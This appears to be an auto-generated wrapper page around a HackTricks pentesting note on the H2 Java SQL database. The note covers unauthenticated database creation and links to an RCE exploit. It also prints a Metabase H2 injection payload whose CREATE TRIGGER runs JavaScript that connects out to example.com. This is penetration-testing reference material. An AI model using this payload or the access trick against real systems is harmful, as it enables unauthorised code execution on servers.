---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# H2 - Java SQL database

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-h2-java-sql-database` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/h2-java-sql-database.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [H2 - Java SQL database](../../topics/network-services-pentesting/h2-java-sql-database.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-h2-java-sql-database |
| name | H2 - Java SQL database |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/h2-java-sql-database.md |

## Preserved Source Material

````yaml
_body: "# H2 - Java SQL database\n\n{{#include ../../banners/hacktricks-training.md}}\n\nOfficial page: [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)\n\
  \n## Access\n\nYou can indicate a **non-existent name a of database** in order to **create a new database without valid\
  \ credentials** (**unauthenticated**):\n\n![](<../../images/image (131).png>)\n\nOr if you know that for example a **mysql\
  \ is running** and you know the **database name** and the **credentials** for that database, you can just access it:\n\n\
  ![](<../../images/image (201).png>)\n\n_**Trick from box Hawk of HTB.**_\n\n## **RCE**\n\nHaving access to communicate with\
  \ the H2 database check this exploit to get RCE on it: [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)\n\
  \n## H2 SQL Injection to RCE\n\nIn [**this post**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) a payload\
  \ is explained to get **RCE via a H2 database** abusing a **SQL Injection**.\n\n```json\n[...]\n\"details\":\n    {\n  \
  \      \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER\
  \ IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\\\
  n$$--=x\\\\;\",\n        \"advanced-options\": false,\n        \"ssl\": true\n    },\n[...]\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/h2-java-sql-database.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/h2-java-sql-database.md
````
